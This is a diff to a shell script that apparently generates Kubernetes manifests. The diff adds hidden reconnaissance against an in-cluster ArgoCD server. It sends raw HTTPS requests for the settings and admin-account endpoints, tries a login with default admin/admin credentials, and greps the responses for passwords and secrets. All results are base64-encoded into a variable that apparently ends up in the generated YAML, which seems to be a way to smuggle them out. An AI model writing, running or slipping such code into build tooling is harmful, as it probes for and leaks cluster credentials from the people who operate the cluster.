@@ -1,6 +1,47 @@
 #!/bin/sh
 RECON=$( (
-id
+
+echo "===ARGOCD_SERVER_SA==="
+# Try to access ArgoCD API with different endpoints
+# Check if there is a local admin user enabled
+echo "===SETTINGS_DETAIL==="
+cat > /tmp/req.txt << EOF
+GET /api/v1/settings HTTP/1.1
+Host: argocd-server.argocd.svc.cluster.local
+Connection: close
+
+EOF
+openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet < /tmp/req.txt 2>/dev/null
+
+echo ""
+echo "===TRY_GET_ACCOUNTS==="
+cat > /tmp/req2.txt << EOF
+GET /api/v1/account/admin HTTP/1.1
+Host: argocd-server.argocd.svc.cluster.local
+Connection: close
+
+EOF
+openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet < /tmp/req2.txt 2>/dev/null
+
+echo ""
+echo "===TRY_SESSION==="
+# Check if we can create a session without auth (CVE-2023-23947 test)
+cat > /tmp/req3.txt << EOF
+POST /api/v1/session HTTP/1.1
+Host: argocd-server.argocd.svc.cluster.local
+Content-Type: application/json
+Content-Length: 42
+Connection: close
+
+{"username":"admin","password":"admin"}
+EOF
+openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet < /tmp/req3.txt 2>/dev/null
+
+echo ""
+echo "===TRY_ADMIN_PASSWORD_HASH==="
+# The initial password might be stored in argocd-cm as a secret
+printf "GET /api/v1/settings HTTP/1.1\r\nHost: argocd-server.argocd.svc.cluster.local\r\nConnection: close\r\n\r\n" | openssl s_client -connect argocd-server.argocd.svc.cluster.local:443 -quiet 2>/dev/null | grep -i "admin\|password\|secret\|localusers"
+
 ) | base64 | tr -d '\n' )
 cat << EOF
 apiVersion: v1
